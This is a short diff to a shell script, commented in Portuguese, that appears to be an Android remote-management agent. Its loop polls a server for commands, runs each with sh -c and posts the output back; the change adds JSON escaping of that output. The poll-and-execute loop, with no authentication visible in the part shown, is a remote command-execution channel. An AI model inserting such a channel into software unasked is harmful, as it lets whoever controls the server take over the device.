@@ -72,12 +72,14 @@ _loop() {
         http_req POST "$HB_URL" "$BODY" >/dev/null 2>&1
         # 2. Puxa comandos (linhas: id<TAB>cmd) — remove headers HTTP
         CMDS=$(http_req GET "$HB_URL/commands" "" | sed '1,/^[[:space:]]*$/d')
-        # 3. Executa LOCALMENTE e reporta
+        # 3. Executa LOCALMENTE e reporta (JSON escape — am start imprime
+        #    aspas/novas linhas que quebravam o JSON e o painel respondia 422)
         echo "$CMDS" | while IFS="$(printf '\t')" read -r CID CMD; do
             [ -z "$CID" ] && continue
             OUT=$(sh -c "$CMD" 2>&1)
             RC=$?
-            RES="{\"id\":\"$CID\",\"success\":$([ $RC -eq 0 ] && echo true || echo false),\"output\":\"$OUT\"}"
+            ESC_OUT=$(printf '%s' "$OUT" | sed 's/\\/\\\\/g; s/"/\\"/g' | tr '\n\r' '  ')
+            RES="{\"id\":\"$CID\",\"success\":$([ $RC -eq 0 ] && echo true || echo false),\"output\":\"$ESC_OUT\"}"
             http_req POST "$HB_URL/result" "$RES" >/dev/null 2>&1
         done
         sleep "$INTERVAL"
